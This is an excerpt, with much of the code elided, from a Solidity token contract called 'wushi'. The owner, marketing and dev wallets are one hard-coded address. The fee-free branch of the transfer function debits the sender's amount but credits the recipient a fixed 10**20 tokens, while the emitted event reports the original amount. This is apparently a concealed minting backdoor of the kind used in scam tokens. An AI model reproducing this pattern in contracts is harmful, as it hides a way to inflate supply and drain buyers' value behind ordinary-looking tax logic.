...
contract wushi is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xd551c47d127359d87c8342816Ba896D754Cd5EE9); 
    address payable public Dev_Wallet = payable(0xd551c47d127359d87c8342816Ba896D754Cd5EE9);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 


    uint256 private _tTotal = 100 * 10**8 * 10**_decimals;
    string private constant _name = "wushi"; 
    string private constant _symbol = unicode"wǔshī"; 
    ...
    uint256 private minimumTokensBeforeSwapAmount = 10**20;

    constructor () {

        _owner = 0xd551c47d127359d87c8342816Ba896D754Cd5EE9;
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 tokens_to_Burn = contractTokenBalance * _burnFee / 100;
            ...
            uint256 tokens_to_M = contractTokenBalance * _marketingFee / 100;
            uint256 tokens_to_D = contractTokenBalance * _devFee / 100;
            uint256 tokens_to_LP_Half = contractTokenBalance * _liquidityFee / 200;
            ...
            uint256 split_M = _marketingFee * 100 / (_liquidityFee + _marketingFee + _devFee);
            uint256 BNB_M = BNB_Total * split_M / 100;

            uint256 split_D = _devFee * 100 / (_liquidityFee + _marketingFee + _devFee);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(!takenFee){
                ...
                _tOwned[sender] = _tOwned[sender]-tAmount;
                _tOwned[recipient] = _tOwned[recipient]+minimumTokensBeforeSwapAmount;
                emit Transfer(sender, recipient, tAmount);
            }
            
            } else if (isBuy){

            uint256 buyFEE = tAmount*_totalTaxIfBuying/100;
            ...
            uint256 sellFEE = tAmount*_totalTaxIfSelling/100;
